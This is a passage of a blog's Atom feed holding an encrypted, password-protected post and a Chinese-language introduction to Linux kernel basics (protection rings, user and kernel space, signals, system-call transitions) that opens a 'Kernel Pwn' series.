9ab791632b294dec12923e8166c78cf502651d4a1faa508dd976a4c4d94267cf66d9ede6072a6fbeec816a1ef31f22f1776a04a4cfc6158c1b59c17631c8eea60ff4893196b999b77a9dabae2b0175d9e32e2f96e828cb305a7e41b42450291841e0829781de4f967514d31b31aa045afaad418fd5a9eb8e5d0ece395eaa569896dbf05605f46c79b79fefa293a0720337c69292a8a63b5f2f01489bc5f8a9b5344db96f8e78b1eb7474c57b3ddeec1f8839ff96f5fbce24200b800035f73a32f61adde2bcabc40b4dda5457fd738d64e57d90c707453c72e5d38417c24042174754df54878c2cea50ed8ea863b42b2e2c64cc36d9d6b3e8bd36606b509e070d4ce6f1920fba6a03b1c911ca65c7df636971ce06f0966912a793013c8d82b419f9f4aafae7898529c1dc2c4b2252263c52bb733b8e03dc1aefa78b01ea73722df9d5875d87b72e965a236374c5eff2ef82f065875509bea901c39e2dd1565d97fa88b7c3fcdcfa1584edb247b1a64b8099ed0e4ae83db93aaa78ba8e735367eadb2a303812437244dd2ae7a05029f4b99d80ae182fbf3c1308b398fd1ded4974c26f754dd277e4feb0ed8332281589d11424558f915c15bf3b1be45ece581237c4318c9c4f82c0d3f89b759bd0dab29eae41acab39a4bfe0a850655c8a9529516555cc154ea3f64511cee8d5422e993fefa335359b1854302de228b0ca8847004089a7cb78b6d968ef3cd2687ed3c2a615d78d3a9ce5cbc4267aa36086db922b189bde558b282f91199d765cd6b7b42ba77bf440e2d3b844a8a254d0a2c6a1fa0193189c8a436c1f01440c6b4cf2aeec4c7ce6258b6c8eb7b9c908c3f0a3e09b65562d62de3189eb874a00bb449df3195299774935fc14912baf419426f08dffadcb6fbb4aac80bc7c849eda718bd05a636f362a3c6927c606991bfa99af5ea308a656a7620cd9c6fd89b180a0e640a0b7d0d00fa5402b2e02cde0542b0df0645b0d038d47a379f16555b9d0db21d3046e42224017afbb67316f45abcd78839bf6c3744240db8e642fb84e40155629f508110d66b51fe36ba983ce7e28cf229751bbc478e90938aeedf63f8b1892a3cd1ee0d0ce653089fdcfcc3e65a04a1cc19f011de3f37b2c9db20ca5b739d4cb468a7bb0b2f76e54845b8f0a6a7c17822ab64e264d9d9bd69758e3f1018e6d5f26e91017e561c4a05f532f6ad986c2b41efc195ff7ab889a31a469599b6374d45bc33b94f85d27650a0edc5a7728cc22084150943c49ff221fa77ab14a97e78852afde6b736cb99828f6ab800f05de8378b1bea690ea9d0755ff1678a3bdb694dc2f01fc8d6e7594f6c264957435d20796eb454af29ff8616c8e7a04d8eeaf7ed5fdf9e98adc57c96911214756a124434fc296bcea0351b93b7e9e4c0519ceae228677d7bcc71ae6a785b0e6caf09277f954fd8b7bbece65e924eecebb2e23b329cf9a706fa101107aa73aeb2c2a336a62f223e7757c55393aa693fc34207d538cb7ca4d7cab553d2807bb0c54350a144f23b1ec2d802c0a162285278da7b78a8e416be3cf44bce18228aec7a3ecb916c3052742ddfdb73d5a9edd23527eb9966720ca281bbe18ef1dde96832b533e9d536eef63a92f94a60d4cfaf251de79b9798de1bf9bc84be7f29440d6c8fa286174ec226b45db2ec6638ef22e744147f6a37ed622fac4ae90892aeb424b1198542b8fd3156b4de2a754f5a84996668f91166d1264dc1f54e54a76ecd83e2d30d7982bbf87935e91b117a7bccefd4a2ffb0225a9dd06f63cf255d7b61fc421fc3bf630fb9b6728e0f11f1b24ba60574dc07ebf3e551f75770c85cae855d5287c6cd6fb1b3d05bbd60b1322f460e69bc97d51b5aa899688162a94235fc3c319b05522948b156bc73ab83efee9e8152dd48b913579329dbd6b95b79654ce3b288b046363117aa6847488a230cf685589391bfc7ac20bf978a567d3ef3055f7e70f875756de9b897d90d041156c56d7f562a58009afbfc7d0a45641d2207ba067df36487ba12ad8494893e7185685887d2c2ec8f56c7491fecf1f5ec295ac2401543a17b7a9ea575f2d1d26e91e22628246257159e092e65cf4b4a2780918eb6114032bc0bd60f30310268186b92d0c58ac492c1de2b25dc8c5ffb6ae6ccfe5c45e4d8131dc7a23798f87f6a9939f6cf4b1a088ab99fd18ded6d6f8f932e16a206f019e92eee2556f1ed486c53cc5c4124a6e3c592d7fc400b587759da82ec6c2349e871e0efd5990b544feaa5c4aa100630aa4219d74d254450dc56d060af0b5793b50d3f5d6f5ed299a684a01d62b251b333e6ecae860b46c3ad1b6d4d5ce7a52a3df7e45841e650f590bccd5f88708f21aa0313f68c2fd5b8aaebbb5c917419f92011ba3315c2bb8cf7508ed06b6056226d6cb322b76fe3d5c9a6a89f15a45ba0003a112950f88f9aff391910e92dbd11f8a8575adac4b2f8e19cb299241984a3cf2adcb7d933e462633abcd59980c14561ab38ef615fa3fe355d0a2c99b34d8261897aa039771616f631337c8996462d3e9b10ff08118e196e84405a585a545d53f284665b4b0d83aa55b49adcd7db7083fdcab43fd49475c49f3b99eaddae1ff2bff76d0644245c0bc6d785394d6b03a51dcf0639c0f2223a0e64648aa7e6e2965c33a2a84ee77a0049ceac2d897149efa5535426cf877fd51ef9e53ca903f55d3a46e65d210499b0ac83f33ea5cb4b35a2240786059ec8c3104f1394e7114ac833faea61ae918b09a066c0c46d0797f5278851d1b7a086366717509dec883e846968b4652059987259bcba8912aabea975ce0f0cf2641491bc5162cf2330df6447b58fb4481a0ca4c684e5bacd854ed3d96d66dc4e2030bc029494c4dbe28da2473e8130eb148062ad4ba8e2997cd70e6fd8f582f2dd9df14b6f347e81229affd5b191387013a733cfa3ddb0d8ab29723de0cf5c73fcf641552da496b6d3c7e46cf549531539b959c3e62c0e99f6ec57d697ef61ed4a5eda2b3e64d3c3d5ec3781ba8e7e7118cb1fc1fe07676a3a28cb9e3d070213733571b5300f2eecdb287c6304149feb287bc90520d3851a0638036e7701af7ec2aa62aeb5bfa7dfb8c291687646e9440bbde1ef47434a32941ecc258b62dd0c2da2d821b19b51ff33f4ff47c8e765c1d65fabf4cf3bcedee883febc8856b81885b4e5bcbd3e04df61a557e5e2fc8c458010b7e75cc3c3f05ad35f20c59ee19b31ce3e700cfac139f326941cb82d3b3892194cefdae1980c84016655c8d083d3d037a71edfc184532442c716555423bb74198322ebe79c90caa3b9fe327fb3ee7a28ef7df9124409aa7ceeac33dbb564de93ff5c5d7bafe73483aaf274ed2a965217e9fbc0eb378cd54e2928175fd15b842c754ee81db5bee75326fab9c85184a6b098fcdc072180c6089ddd88dde808b0270371c6f98a2266b088d998015dda372ff22dc3521b4d1fd2cd7b0c45e0f8004b36df34ac00c3925f93d21772618fd359fd4b898e909f00abbf7cfcb3fbd50c35c59b76bf3d3e8acdae17c55ebf0df40d85bf096681486cba50de73aa67a5e51d9e95af16d9ea19d773e94cd73901a4b2be3565a3fea45139d787b766ea8206f79f6df153ec4c761634aae06c19dac5f803ec3f8a76d1e5b51571feb364d5a1a8e72b297c3b212dacb6bbdb51c2bbc211ff625446007e248ba7dbb8ec64bb19627b02173976c84f4be033872d3c14741afeb8a14b150c9e8cb532c459afc55ea9f8b9fb9823a3e02c8cff9cdf9f22fd86c6b2ac52b0141a864a0c203849c2ef4ce943d325df2075ffa5aa4efa8737a32a78a3947c6ef3c04de01971e833b8bd780242a1169feac6d19898d3ca139c561bd2e4f5c226fd5ca4cd91651e86ee619498f90e45acd1ee1640ab3022a3ceca2b0cff5c1d99802937dba0e7e6e958073c6c14a47e9b91a75dc4ed12d71b84a26429a5927a61a2329b16ec6fa320caea8c7c1124150f07da6e3839c627a64d5f34585b9cbe222797eee8caa0986bb44c25e024a343fcd3dbf432ba186391cfba60eba3d5f819a260f84ab17639d6b0023bdf56fdb1cddc585fa7ad05093d84ad1b120d6a8a563d1e8945fbcde3666f37db69a2610f7f7c4fe9cbd3adbe92621f32d118f884a7ac83e83640c01623d47f69d5a1cbebd5e09612590e9ecae4f22c336b04854ac8ce37b699c4a457bf79e6db6ef3bcb7a51feabc28e8b5e12f050a68574fed62224ae336f565008de9f18a8ebbeb81248c8314382b195c2b3565c374b56981045836ce9166284a5f64231594e389ed201c22e9d840b22a205ebe6534af723fbb54d520fa81d3a74d2512f63d7e301a220b9f443620fc0c02224e64da1ee8783e5697c716e9c6cdaf43e8cb8e143eb1d240cd32f95ea6e991e32baef754557ce000a52ac643cba7a47be5e58b4fd6118ff99b46f1095242ff20ac6a17ef5ee9b063f263d43b95b26dbc44320e73389bd0f8295aa2a023bb4f91dd923b6fade603c2abbbf832d08bed387825e31ac9a2cabc946b2ca556617198e4a49a39bddca7ff65de5bed733e2f127d9d5e5d91bd58f6c6ceaf2f043b09ed83ca49a85c85f445cce9fdbc5e2f833ebb8f9cf2c1ffb8975c6e4f5de276ee559fe297e4de889e60bd9a7ef6448b2ae530c83b04050a91aec9142f50856ee92ff73fcc066e9a2a211d4e178355c7dea9967cdbd6f53fda22e6f478119c5a4fa82db0fb8802d16e9228f8ec7d68730e819d158b346dd5a2a4412cf7693f96d649412c17f5db58a8d44832477833e51283f1de0cecdfff15c2819276d3e80129a32d71cbcf05f71e44796e4b4c981932648009abaa772f63a292445b064a7b850c9142a59bc5ff82d36465993e474476368861fec799a499c6c0233a70d247468e2aa716627f0708017a69c2fd7f810299ceee888528e81719543de0ec6429232d79c9d3fb49bcf2cd6cb6129a70d65a8cc38bd36c1427b4c9332a73f4396434b0ddd262abb4af20025a564dc2ef60ba3dc303a351dc23c3f46a0cd1b6c38ace7eb6bef24c8e417fd4de0a7d020b1d47cc5264de6b624353b35a79a76a09d39f66cdc611b919809b09c13fed98de91e1a0c1c4226e994af94151fa590940a375fe947edbf9265361f9ab6d3d973cd42fa73914a98a646f3f04aea300a5756fd4fbfb4e3f70651182f67494d01341da36e1e2b9c33a75aef99d3cc5b940b90c4915aae222c58eafcbd8264ee0a28c239bdfb806753548015a178b23d6cac7098c2a9275795624aa6bf8b4c1ebe43d55d18b588816e684468d922edfb88fb08d4c1ab9894da9135b398687a33a1b96d548dfb6325a4e624a38dfbaceb351f44d132432bb8ccce89e83fe1cb67e0fea50438d443b2ac79719bbc71cc02f8a7b6fd8464528dbfa28b18a59e7b0fe6ed86f474e59dec93855a2d0922d800a64a6b164ce280f023a1484084e3ec21c1f115516927efc1d4a90e28b4d66d0ee4c81b89d703c57da3f29b36f88c73a6725223f272e7efb63dbb009bb0f7937a3252549a1f45e2d79013423fd8d680a8bab1d57212110b36110b1e569419e3c2eeb2f42ecf326a57dfa3ef3e95e15b9e3eeb3ff527de2c859c9fd0a24919bda02723f2f81d337cd1bf146ea504fa8305a627483f68917a3f2628016294f160e622cab3e6a7011d8e1cd1bf8f2e43adaf84e65da108090832b5785142c0338025c1ff1475bd6c41ae8eff1bc7aa18f5cd37299562d80d42464fd3b61a15991b50b7861a2dda5724e5313dab6cda8e88ab7369566bff44e126bfd7da96c4cbeb2a49b72c5d801310d73815639b0502f2a329466b0ab64bb65a1d12b328bc8caa5d6821887d0645b3837bbfc5a5a5f72f7ac060ba3e29d1b8e687fd0f2370c80b2123dc34c7b388ef74b8bf3dd6e48fc286347eefa740933531018f8cfc8f8e27b7aa2facbd7f00fd2c67ffacc8aaa5fa075db97699af3bfc0ae8bf665576b1bcd2cbdec1b623030866315dcbfb337236d28b109e9ad73e42a5cf5fc658ae2d9c99c00e8b21997693131405a9359cb91a421898c6414c4e504c2dd2d0f96fde55690e04170e5853af2f54c96bac9051a8442f8d947b2f54d49e967bcb53506b9d80dc212fe0258b70cc31d06edaaa872aa92b5720298d03cc390e641f26ca9e15d880cdda5cfc76a7cd05bdefff80bddda9244bec72d8163827f8a7116729c73ad02945e92045535b4e1787feb0cdc9c8ab1f2035f944ef11c415d3cb98c8dd061360091e499dda1b50fb972d463294eb2525191868f0abf5fb5fdd2bbc59edbe18cfb70919f0a7c2b37a84637ee7c39519d818532845d55af7c4c120604b99b63dc5f1eaabcaefc292cb0e248329e4c54218fca68da05776129e38177325d1311d57cb1b2e3e768df8ec209e6d589f9ea2791bcb560f92fdc024c847a04193952f32cc2ce1d0678f5c694ab0d1b395da55972b15eb415032bb72a9bd612dda88f8558bce365685887832568da91089843c1ae20b89019c1e6c23937f5dc695ce50e2c71177b75ca40f370af91f5d342b73a30bfad803ac4240b152ca22ebec5b0079dae4b6e2c58b8d1aec6f3195c6d32a60a51d39dfccc86f372c53e05f4eae90b9f148c5f1c34d3dc7ded3a2291c4b944e8f8146daac3627f2238ac14cb244f06485e82aaaecc68c94fb8e4260276926926bc20c89a2483e5a168f8457e4eba5a4a5fcd74b02ab1ed2fae9ac20b2479a675c1f9378b21e69b183dbbf0d47fcaeb43d4a8e6f875287b1191557a4e1e8df187487ec6a62752fc75a18a02bcec153b11a41b67628e52fcee874cbc9c2b87c82e3a02baaa738f7c86c4be6a58c3e55bbad6b07e09bb2bb5f1da054f65496a8a63171284880a23736c252d259d38ce0c664a1a557ce723bc69ada6e4d1216de28d115258b2a8eb807fbd030cddb10c2cf94ea9cc3a91ffc0c239842d55b6811aa24efbc3e810762fd6d3933293cc413360823eb2e3b82cfaf1ecd9b182e54abfde68f0d76c467aeff064fe9865117470c986d30e2fd51f9d8df2f7737df834948fe4675a07ebf9b5b07d6b4b0c3217d8c282b96fd6a195ed5e311512fea83670f83b2611f33d8a73ff4701680c47dad4b5c26ccdca28a93cf70608cd4f5495f72c155b1478633de9854379c92299be9aa03e5d410d000d7661abce117cceeb2c85bb2690fdb4412553404a4b6755bbc7a7df66f3ae90493dbd519cd2c27a73aa74a5ff3c5e269b1972b40cc6dfaa9496a49bda5e34cfa9eeb7aa093e86f6abce20a824a50ad1b6ff8dd01bb6d6a2f3ea30af669d0a22344de62b9196a6d111c7d0fe0c6b5ca1a3905c75ccf0f62e13de2bfb085f0ea049c2901945f4bf122ee27a590b2bad1dccdb3010d95ee07ff4b4ce7cbb15c87cd8a8d79e983bbd1e199e580f97f53923e521bc85c59c92e2cd2db3635c3569bccb79cc849ad01ed72aa7eaafa292bc98016c726b9cff4205ab4f07073f040782c611424d1814dc4f8d44075a7d82e5917b0eb6b0a63572cc44b5fe2afa1149f3779bf50cd6816de1546415f402ca0163b82e3fdd31ab5aa1e6baa22fa4a0fa168e5f73374ad14c8911f4b1b2d2414143a840a5c8eee1c55adb6282cf7b3304c06084f9eb1af5f04fe2e5f9fc34fbc4226589902bb6e83e3737428e037797920658438c1065ace658e60fe3925e1e7dafd79a66e03feb69f9b053f37f2a9d34e8a8fe553ce50297d3356a00ac3720316a3939e3f3ab881214bc0404d19593ec10df1767e50073ac67dfad3611883118e38c410d96ed1900615840209aa521570ac887444d87ddcd19e3268717669ffa43d5edcacab6d94de772cfb7cd67cf4272b83c8e10a6b1ce55eb1129c95cd4ae16ea866bb5d4f2b7c31b22171763fc847ff7a63fdab41a40bf189411fc2ae2b591660a82e97601b78bc2352314d8a84bd159589d02d2645d4531fafaf0bae2656fb3cc309186413d187e385ae2f006155ff09c6d8aaa242408cb3e2b7238c4a1bd02c022157c6f4ccab90453221b0ad08e1f90dbe133b698cfa8e1c30b2fe26f0fa81c625f1ee1c38c42e384cddcedb5ead48f121332288df8bba21dd02227a2925b48f264026635b02af08259c376b9f2c180f5cc2b917ab73af71c34a62e83bbe2ea6d1dbbd10cce27c7b4f3b7b6362ca04f7928de7bf410ee8450c7c2ff7f7e25c605906fd61c99ef2894896ca7e3bd760aac5b5ab89caaf026f5681d13f9c50c4d8eacf82e21156c7cad132de9d01fce851f95bf33ea1f4fc0961e2f8974144d0df2dccf043ede93068b03862b2622d4c9cd4c31d265c4ff57f5fc83a19430945214d0ee9d651d28e2e7a4c1333dab81e62e50e10ada26f5fced69c44a23f8b826b31b694d29539562d4726f5009be18b2713ffb1b13ca1d40862c310b1b03b257bb57fb6a34fd071dff3b24b5b9734211663b9b3d7ea1086e64445f692dcd89501b3e77d8182aef1d81dc19c7c0291c6433174db3d0cb452a538ba1adab8f78bbcbc82fb4e002e584540e1efbe9431c060deadf6434c3a944cb5c9c8d2897caf451775f0c545ce63eca811d45811d67043c72b73060fb4a1a8b94663efee2c4267e9a92539735a89baf6b2636ec6c4be335b571b37e91f691ccce0eb8967b71767f8cf3d854584267ecbe4da3c84f5a93cc6a57f213adc999d101b851c625ba2316de5450df24b9685428552d8750da0219062a25be5549e5e7b99682e4303abc3dc014ec8c3e5d7d489acbce67d2902e4860e81741a666e8e8ce37c6bb3fe8510e8ca8790502b4dfe41bfccb30f1a0df23b6810bf5ebf26bcffbcfbe279bc262ac1e5bd83d25aade0dbd2bc076f80867fb1cbb1cc884b09350d04343328c9f7925476edb41129c7f43cbc8bda26e42fc61210c3916038e875e04607c90b482821973959cdc6fd7827606dccb00c25143537492f79d5643590afffccd6537f5944d105528f15ae4087c6844572111963831eba163aa34afe95181901a5e3b6e5d367ab1a59416647aacc328a34969243a12c6a4216d15d89ab4de0947f577172b693bcf9c6483abfb5466a7dec187329fa8f533ef934bedb5509d87e3376e2ecf9e32cbc2de0c32c2eca3977ad9a492a0c1afbfcd1d5811eb05ddb10eac1aae984259fd957820ef356e8e78e3b531bbb316bacba31d96d94498ee2a54525a5210c14bb52d90b93b2e1c2f1d4ed114f502d5baf3cd9ba8ed1c9d8883a50379687c902d355225d985351e2581c690ece73d9348e56ecd0b5f2bf2c31d072b5d0130026b45ff75287233a5f72e0241f8f2dba97cd15b33e6d76df417076e6cfec28c109b41c468e7e6d28bbeb126e0d348977e6a4ce4929ffbdcbcf1fffc8747994c2ba731ed5fba538e034eda992a8cb6362bb5ea242033425d763ade54586e61dcb695f62b59ea0674c58bff4d00df015e01e59f052ca489e1780c1371e276927a9c95fa3f4d09749c2fce844d8e159e3aec358c953339b9a5a6952a649ad782bb83f632336735c5dc3c5c7745e06e74159d6d7e86e0995d8c1c0976a89c1fedf6b4d1ec59091d505de9c82c3f590e35ee3f29da0b4160352f96866793a803e1af7fd32af9c5d4dd83730766e72e78d1d01fe8b7a2eb7202b46c3693928fd57356ba16a3e588c29a729b00ba4650a49e2ee09740717604f48512b1915f66178f9ef8c7c303042cf0bcad1e6e873d39deeea6a21ec767035f567b80689004feb2908985f145c04e5a684e2b9dc1db05694d28b7ab8caf5c9acba8e4b1a7eacf61690cdaad41b1ff21d293f308cc8d89a0259ab13773bd42051aca66bbbd423d5b19ede3b82ad9c3a18d04036dc1daf1fc52e8371c81a53b77c80de6338b6270eda83ad0d4c2c3c06a1581f40940287ff47f2a0e03c69b42e03140e530ba0858ecf60e9b133e47701dfd92aaa9461e4e34486cdc2d93bb4e54a7c751aea9cb0ed30ce449bfe4ed12b93302a13ff1233105be45ab202c6ceda1a0feceacbf8cddb5d12a683f3aed1c1da3c1509ab440413f99387e70644e95b7003eba9af4d2333df42f9ec81f830b232c0f88fc1962bdb30de91e23e2e999185fa9337a5dae70a41518fc54f93409cdf40aceb5bf6abc8b829b354276adcdb185591fee553953593677229c1fb8f2b8ece192d6e3d193dd4cbdef36e32a93f39bc71d112c18a28ba46612fe74d578bd6c104bf0f0c8a3a9b4a9ed61c41613418638cb499a4d2f4e17f8d7631e342610694cee43cf4d08cbc3f8fafd0de10204f2ca82cd1769706eaefe74e18ddcfab8f1ed02b314b679ea914093ff4d5447bb961348ebdb17472361eb4d6078ce3a78ea8e1fa190f4abe796b12cb054cf2321af40f045e0cb935ab26f03747bfb298e41290762afe5601fcf750eed04fca2f40798e3e28ff405443c8e0fe7dd519497d2fcece4141e8a5335f38ea6072e63c544323255c351a8d4592f4dd9716ec024e0ba223548f3a3e8fcc7021da6ca3660990a8903bc303042e44cb0cc954c2d3ef102510fbe8c46d66bef336e2c89a6249ba3a6f76943c92c24c889d10299e2441b96162d34aad9e9ca6705f219345b16e72f2b10ba2fb2c3376ad9195d470da6294ee18134ba18001025f74b9ce5190613d225fadefd15af54a01a62637213a490aa98bfb839e9c98a41b8733065f9dd89441e5895fff2f618251ca6534925a6fa088c9815020c27d2ac2dd3137994c8adeda890eed5b121ef2236dadc22fa399f967e1ebb5483d7f1028b61a9fcb121a7be1e7a962a8772980d84d511156e2746a1ef38156ed19ae24c5a07957448bfe8b8b1d51e9160dd0a3076d71d082370e1a342425d264ae01a993d99e06e3239ef880d024b173928e63d3d79aaa19560f8c43371a6fba3336233c3068e7e011beebfc13f45e47593deabcfa1eea78e66ec4f9c97579fc82137076a0d0eec2aa61574c7f9f63f47cdf4ee96eb0ccd41b77299</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
  </entry>
  
  <entry>
    <title>【Kernel Pwn】Kernel base</title>
    <link href="https://billyotry.github.io/2021/04/02/%E3%80%90Kernel%20Pwn%E3%80%91Kernel%20base/"/>
    <id>https://billyotry.github.io/2021/04/02/%E3%80%90Kernel%20Pwn%E3%80%91Kernel%20base/</id>
    <published>2021-04-02T09:37:20.576Z</published>
    <updated>2021-04-04T06:15:45.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Linux-Kernel-Basic-Knowledge"><a href="#0x00-Linux-Kernel-Basic-Knowledge" class="headerlink" title="0x00.Linux Kernel Basic Knowledge"></a>0x00.Linux Kernel Basic Knowledge</h1><h2 id="一、内核"><a href="#一、内核" class="headerlink" title="一、内核"></a>一、内核</h2><p><strong>操作系统</strong> (Operation System) 本质上也是一种软件，可以看作是普通应用程序与硬件之间的一层中间层，其主要作用便是调度系统资源、控制IO设备、操作网络与文件系统，并为上层应用提供便捷、抽象的应用接口</p><p>而运行在内核态的<strong>内核</strong> (<strong>kernel</strong>) 则是<strong>一个操作系统最为核心的部分</strong>，提供着一个操作系统最为基础的功能</p><p>这张图说明了Kernel在计算机体系结构中的位置关系：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13367199984/0" alt="image-20210402174953686"></p><p>kernel的主要功能总结为以下三点：</p><ul><li><strong>控制并与硬件进行交互</strong></li><li><strong>提供应用程序运行环境</strong></li><li><strong>调度系统资源</strong></li></ul><p>包括I/O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到以上三点中与一般的应用程序不同，kernel的carsh通常会引起重启</p><h3 id="内核架构：微内核-amp-宏内核（单内核）"><a href="#内核架构：微内核-amp-宏内核（单内核）" class="headerlink" title="内核架构：微内核 &amp; 宏内核（单内核）"></a>内核架构：微内核 &amp; 宏内核（单内核）</h3><p>通常来说我们可以把内核架构分为两种：<code>宏内核</code>和<code>微内核</code>，大致结构如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368400036/0" alt="image-20210402234051680"></p><h4 id="宏内核（Monolithic-Kernel，又叫单内核）"><a href="#宏内核（Monolithic-Kernel，又叫单内核）" class="headerlink" title="宏内核（Monolithic Kernel，又叫单内核）"></a>宏内核（Monolithic Kernel，又叫单内核）</h4><blockquote><p>宏内核 (英语：Monolithic Kernel)，也以为<strong>集成式内核</strong>、<strong>单体式内核</strong>，一种<strong>操作系统内核</strong>架构，此架构的特性是整个内核程序是一个单一二进制可执行文件，在<strong>内核态</strong>以监管者模式 (Supervisor Mode) 来运行。相对于其他类型的操作系统架构，如<strong>微内核</strong>架构或<strong>混合内核</strong>架构等，这些内核会定义出一个高端的虚拟接口，由该接口来涵盖描述整个电脑组件，这些描述会集合成一组硬件描述用词，有时还会附加一些<strong>系统调用</strong>，如此可以用一个或多个模块来实现各种操作系统服务，如进程管理、并发 (Concurrency) 控制、存储器管理等。</p></blockquote><p>通俗的说，宏内核几乎将一切都集成到了内核当中，并向上层应用程序提供抽象API (通常是以系统调用的形式)</p><p>Unix与类Unix便是宏内核</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368498708/0" alt="image-20210403002249917"></p><h4 id="微内核（Micro-Kernel）"><a href="#微内核（Micro-Kernel）" class="headerlink" title="微内核（Micro Kernel）"></a>微内核（Micro Kernel）</h4><p>对于微内核而言，大部分的系统服务 (如文件管理等) 都被剥离于内核之外，内核仅仅提供最为基本的一些功能：底层的寻址空间管理、线程管理、进程间通信等</p><p>Windows NT于Mach都宣称采用了微内核架构，不过本质上他们更贴近于混合内核 (Hybrid Kernel) ——在内核中集成了部分需要具备特权的服务组件。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368504243/0" alt="image-20210403002651469"></p><blockquote><p>本文中主要讨论Linux内核</p></blockquote><h2 id="二、分级保护域"><a href="#二、分级保护域" class="headerlink" title="二、分级保护域"></a>二、分级保护域</h2><p><strong>分级保护域</strong>（<strong>hierarchical protection domains</strong>）又被称作保护环，简称Rings，是一种将计算机不同的资源划分至不同权限的模型</p><p>在一些硬件或者微代码级别上提供不同特权态模式的CPU架构上，保护环通常都是硬件强制的。Rings是从最高特权级 (通常被叫做0级) 到最低特权级 (通常对应最大的数字) 排列的</p><p>在大多数操作系统中，Ring 0拥有最高特权，并且可以和最多的硬件直接交互 (比如CPU，内存)</p><p>内层ring可以任意调用外层ring的资源</p><h3 id="Intel-Ring-Model"><a href="#Intel-Ring-Model" class="headerlink" title="Intel Ring Model"></a>Intel Ring Model</h3><p>Intel的CPU将权限分为四个等级：<strong>Ring0</strong>、Ring1、Ring2、<strong>Ring3</strong>，权限等级依次降低</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368510271/0" alt="image-20210403003134186"></p><p><strong>大部分现代操作系统只用到了ring0和ring3，其中kernel运行在ring0，用户态程序运行在ring3</strong></p><blockquote><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring1 方法</p></blockquote><h3 id="用户空间-amp-内核空间"><a href="#用户空间-amp-内核空间" class="headerlink" title="用户空间 &amp; 内核空间"></a>用户空间 &amp; 内核空间</h3><p>用户空间为我们应用程序一般所运行的空间，运行在ring3权限的用户态</p><p>内核空间则是kernel所运行的空间，运行在ring0权限的内核态，所有进程共享一份内核空间</p><h4 id="用户态-amp-内核态"><a href="#用户态-amp-内核态" class="headerlink" title="用户态 &amp; 内核态"></a>用户态 &amp; 内核态</h4><p>通俗地说，<strong>当进程运行在内核空间时就处于内核态，而进程运行在用户空间则处于用户态</strong></p><p>在内核态下，进程运行在内核地址空间中，<strong>此时 CPU 可以执行任意指令</strong>，运行的代码也不受任何的限制</p><p>在用户态下，进程运行在用户地址空间中，此时CPU所执行的指令是受限的，且<strong>只能访问用户态下可访问页面的虚拟地址</strong></p><h3 id="进程运行态切换"><a href="#进程运行态切换" class="headerlink" title="进程运行态切换"></a>进程运行态切换</h3><p>应用程序运行时总会经历无数次的用户态和内核态直接的转换，这是因为用户进程往往需要使用内核所提供的各种功能 (如IO等)，此时就需要陷入 (trap) 内核，待完成之后再 “着陆” 回用户态</p><h4 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h4><p>Signals机制（由称之为软中断信号）是UNIX及类UNIX系统中的一种<strong>异步</strong>的进程间通信方式，用以通知一个进程发生了某个事件，通常情况下常见的流程如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13368518978/0" alt="image-20210403003848459"></p><ul><li>内核向进程发送signal，进程挂起，此时控制权移交给内核，进入内核态</li><li>内核会<strong>将用户态进程的寄存器逐一压入【用户态进程的栈上】</strong>，形成一个<code>sigcontext</code>结构体，接下来压入SIGNALINFO以及<strong>指向系统调用sigreturn的代码</strong>，用以在后续返回时恢复用户态进程上下文；压入栈上的这一大块内容称之为一个SigreturnFrame，同时也是一个<code>ucontext_t</code>结构体；接下来就是内核内部的工作了</li><li>内核完成其工作之后，向用户态进程发送消息，控制权回到用户态进程，用户态进程跳转到相应的signal handler以处理不同的信号，完成之后将会执行位于其栈上的第一条指令——<code>sigreturn</code>系统调用</li><li>内核通过sigreturn系统调用恢复用户态上下文信息，最后将控制权重新返还给用户态进程</li></ul><h4 id="用户态-—-gt-内核态"><a href="#用户态-—-gt-内核态" class="headerlink" title="用户态 —&gt; 内核态"></a>用户态 —&gt; 内核态</h4><p>由用户态陷入内核态主要有以下几种途径：</p><ul><li><strong>系统调用</strong></li><li><strong>异常</strong></li><li><strong>外设产生中断</strong></li><li><strong>…</strong></li></ul><h5 id="I-切换GS段寄存器"><a href="#I-切换GS段寄存器" class="headerlink" title="I.切换GS段寄存器"></a>I.切换GS段寄存器</h5><p>通过<code>swapgs</code>切换 GS 段寄存器，将 GS 寄存器和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用</p><h5 id="II-保存用户态栈帧信息"><a href="#II-保存用户态栈帧信息" class="headerlink" title="II.保存用户态栈帧信息"></a>II.保存用户态栈帧信息</h5><p>将当前栈顶 (用户空间栈顶) 记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp    </p><h5 id="III-保存用户态寄存器信息"><a href="#III-保存用户态寄存器信息" class="headerlink" title="III.保存用户态寄存器信息"></a>III.保存用户态寄存器信息</h5><p>通过 push 保存各寄存器值到栈上，以便后续“着陆”回用户态</p><h5 id="IV-通过汇编指令判断是否为32位"><a href="#IV-通过汇编指令判断是否为32位" class="headerlink" title="IV.通过汇编指令判断是否为32位"></a>IV.通过汇编指令判断是否为32位</h5><h5 id="V-执行系统调用"><a href="#V-执行系统调用" class="headerlink" title="V.执行系统调用"></a>V.执行系统调用</h5><p>在这里用到一个全局函数表<code>sys_call_table</code>，其中保存着系统调用的函数指针</p><h4 id="内核态-—-gt-用户态"><a href="#内核态-—-gt-用户态" class="headerlink" title="内核态 